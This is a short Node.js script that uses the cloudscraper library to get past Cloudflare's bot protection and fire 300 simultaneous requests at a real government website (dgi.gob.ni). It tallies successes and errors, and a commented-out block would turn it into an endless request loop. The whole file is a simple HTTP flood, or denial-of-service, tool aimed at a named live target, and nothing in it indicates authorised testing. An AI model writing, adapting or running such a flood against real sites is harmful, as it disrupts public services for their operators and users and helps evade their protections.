var cloudscraper = require('cloudscraper');
const site = "https://www.dgi.gob.ni/";
 
let promises = [];

function createThread(){
  return new Promise((resolve, reject) =>{
    cloudscraper.get(site, function(error, response, body) {
      if (error) {
        resolve('Error');
      } else {
        resolve('Success');
      }
    });
  });
}

// async function infiniteThread(){
//     await createThread();
//     await infiniteThread();
// }

for (let index = 0; index < 300; index++) {
  promises.push(createThread());
}

Promise.all(promises).then((responses) => {
  var group = {"Error": 0, "Success": 0};

  responses.forEach(element => {
    group[element]++;
  });

  console.dir(group);
});
